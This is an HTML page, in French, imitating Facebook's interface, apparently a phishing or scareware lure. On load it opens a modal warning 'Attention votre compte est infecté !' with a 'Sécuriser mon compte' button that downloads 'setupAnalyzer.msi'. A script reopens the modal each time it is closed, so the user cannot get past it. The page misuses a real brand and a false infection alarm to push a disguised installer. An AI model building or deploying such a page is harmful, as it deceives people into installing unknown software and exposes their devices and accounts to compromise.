<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"
        integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
  <style>
    .searchText {
      background: white;
      color: rgba(0, 0, 0, 0.5);
      display: inline-block;
    }

    .searchButton {
      background: #EBEDF0;
      padding-top: 3px;
    }
  </style>
</head>
<body>
<nav class="navbar navbar-expand-md navbar-dark" style="background: #4267B2;">
  <div class="nav-item pt-1">
    <a class="navbar-brand" href="/" style="color: white;"><i class="fab fa-facebook" style="font-size: 24pt;"></i></a>
  </div>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
          aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <form class="form-inline ml-2 mr-5 my-2 my-lg-0">
      <div class="border border-light row" style="width: 300px">
        <div class="searchText col-10">Rechercher</div>
        <i class="fas fa-search text-center searchButton col-2"></i>
      </div>
    </form>
    <ul class="navbar-nav">
      <li class="nav-item active">
        <a class="nav-link" href="/">Accueil</a>
      </li>
      <li class="nav-item active mr-5">
        <a class="nav-link" href="/">Retrouver des amis</a>
      </li>
    </ul>
    <ul class="navbar-nav ml-auto">
      <li style="font-size: 15pt" class="nav-item active mt-1"><i class="fas fa-user-friends"></i></li>
      <li style="font-size: 15pt" class="nav-item active ml-3 mt-1"><i class="fab fa-facebook-messenger"></i></li>
      <li style="font-size: 15pt" class="nav-item active ml-3 mt-1"><i class="fas fa-bell"></i></li>
      <li style="font-size: 15pt" class="nav-item active ml-3 mt-1"><i class="fas fa-question-circle"></i></li>
    </ul>
  </div>
</nav>
<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">Attention votre compte est infecté !</h5>
      </div>
      <div class="modal-body">
        <div class="text-center">
          <i class="fas fa-exclamation-triangle" style="font-size: 40pt; color: #C82333;"></i>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-success"><a href="setupAnalyzer.msi" style="color: white;" download>Sécuriser mon compte</a></button>
      </div>
    </div>
  </div>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
        crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
        crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
        crossorigin="anonymous"></script>

<script>
  window.onload = () => {
    $('#exampleModalCenter').modal('show')
  }
  $('#exampleModalCenter').on('hidden.bs.modal', function (e) {
    $('#exampleModalCenter').modal('show')
  })
</script>
</body>
</html>
